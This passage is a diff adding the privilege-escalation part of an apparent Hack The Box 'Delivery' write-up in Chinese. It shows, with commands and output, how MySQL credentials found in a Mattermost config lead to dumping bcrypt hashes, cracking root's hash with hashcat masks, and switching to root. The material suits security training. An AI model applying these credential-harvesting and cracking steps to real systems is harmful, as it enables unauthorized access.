@@ -196,3 +196,171 @@ dc0dc83c949...
 ```
 
 # 提权
+
+在opt文件夹发现一个项目文件夹
+```
+maildeliverer@Delivery:/opt$ ls
+mattermost
+```
+
+opt文件夹一般不会有任何内容，如果出现了文件应该特别留意
+
+在config文件夹找到一个mysql的连接凭据
+
+```
+ "SqlSettings": {
+        "DriverName": "mysql",
+        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026re
+adTimeout=30s\u0026writeTimeout=30s",
+        "DataSourceReplicas": [],
+        "DataSourceSearchReplicas": [],
+        "MaxIdleConns": 20,
+        "ConnMaxLifetimeMilliseconds": 3600000,
+        "MaxOpenConns": 300,
+        "Trace": false,
+        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+        "QueryTimeout": 30,
+        "DisableDatabaseSearch": false
+    },
+
+```
+
+连接mysql
+
+```
+maildeliverer@Delivery:~$ mysql -u mmuser -p 
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 40
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mattermost         |
++--------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [(none)]> 
+
+```
+
+在users表找到root的加密凭据
+```
+ariaDB [mattermost]> select Username,Password from Users;
++----------------------------------+--------------------------------------------------------------+
+| Username                         | Password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
++----------------------------------+--------------------------------------------------------------+
+7 rows in set (0.001 sec)
+
+
+```
+
+上面后台的留言中,说明密码是字符串```PleaseSubscribe!```的变体
+```
+Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+root
+10:58 AM
+
+PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
+```
+
+
+以```PleaseSubscribe!```为前缀的密码
+```
+PleaseSubscribe!?d
+PleaseSubscribe!?d?d
+PleaseSubscribe!?d?d?d
+PleaseSubscribe!?d?d?d?d
+```
+
+准备两个文件，一个源密码，一个掩码
+```
+┌──(root💀kali)-[~/htb/Delivery]
+└─# cat hash.txt                             
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+                                                                                                                    
+┌──(root💀kali)-[~/htb/Delivery]
+└─# cat mask.txt 
+PleaseSubscribe!?d
+PleaseSubscribe!?d?d
+PleaseSubscribe!?d?d?d
+PleaseSubscribe!?d?d?d?d
+```
+
+使用hashcat破解
+
+```
+──(root💀kali)-[~/htb/Delivery]
+└─# hashcat -m 3200 -a 3 hash.txt mask.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i3-4170 CPU @ 3.70GHz, 1084/2233 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Brute-Force
+
+Watchdog: Temperature abort trigger set to 90c
+
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
+Time.Started.....: Tue Sep  6 03:57:22 2022 (1 sec)
+Time.Estimated...: Tue Sep  6 03:57:23 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: PleaseSubscribe!?d?d [18]
+Guess.Queue......: 2/4 (50.00%)
+Speed.#1.........:       24 H/s (10.28ms) @ Accel:2 Loops:128 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 12/100 (12.00%)
+Rejected.........: 0/12 (0.00%)
+Restore.Point....: 10/100 (10.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:896-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: PleaseSubscribe!19 -> PleaseSubscribe!21
+Hardware.Mon.#1..: Util: 91%
+
+Started: Tue Sep  6 03:57:15 2022
+Stopped: Tue Sep  6 03:57:24 2022
+
+```
+
+得到密码是:```PleaseSubscribe!21```
+
+提权到root
+
+```
+maildeliverer@Delivery:~$ su root
+Password: 
+root@Delivery:/home/maildeliverer# whoami
+root
+root@Delivery:/home/maildeliverer# 
+```
